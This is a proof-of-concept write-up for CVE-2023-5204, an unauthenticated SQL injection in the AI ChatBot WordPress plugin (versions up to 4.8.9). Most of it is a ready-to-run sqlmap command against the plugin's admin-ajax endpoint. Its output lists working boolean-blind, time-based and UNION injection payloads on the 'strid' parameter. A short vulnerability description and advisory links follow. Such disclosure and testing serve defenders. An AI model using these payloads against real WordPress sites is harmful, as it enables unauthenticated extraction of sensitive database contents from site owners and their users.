# CVE-2023-5204
AI ChatBot &lt;= 4.8.9 - Unauthenticated SQL Injection via qc_wpbo_search_response

### POC
---

```
python3 sqlmap.py -u 'http://wordpress.lan:80/wp-admin/admin-ajax.php' --data='action=wpbo_search_response&name=test&keyword=test&strid=1'  --level 4 --risk 3 --dbms mysql --banner -p strid
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.2.1#dev}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:14:53 /2024-02-21/

[17:14:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: strid (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: action=wpbo_search_response&name=test&keyword=test&strid=1 AND 6180=6180

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=wpbo_search_response&name=test&keyword=test&strid=1 AND (SELECT 1436 FROM (SELECT(SLEEP(5)))kZil)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: action=wpbo_search_response&name=test&keyword=test&strid=1 UNION ALL SELECT CONCAT(0x716a766b71,0x585550564e544a4d4a70515873674c6d71554c65434c597077746655737a4f487a6d57427154744c,0x7171706271),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[17:14:53] [INFO] testing MySQL
[17:14:53] [INFO] confirming MySQL
[17:14:53] [INFO] the back-end DBMS is MySQL
[17:14:53] [INFO] fetching banner
web server operating system: Linux Debian
web application technology: Apache 2.4.56, PHP 8.0.30
back-end DBMS: MySQL >= 8.0.0
banner: '8.1.0'
```


### Description:
The ChatBot plugin for WordPress is vulnerable to SQL Injection via the $strid parameter in versions up to, and including, 4.8.9 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.


# External Links
-https://plugins.trac.wordpress.org/browser/chatbot/trunk/qcld-wpwbot-search.php?rev=2957286#L177
-https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2977505%40chatbot%2Ftrunk&old=2967435%40chatbot%2Ftrunk&sfp_email=&sfph_mail=
-https://www.wordfence.com/threat-intel/vulnerabilities/id/5ad12146-200b-48e5-82de-7572541edcc4?source=cve
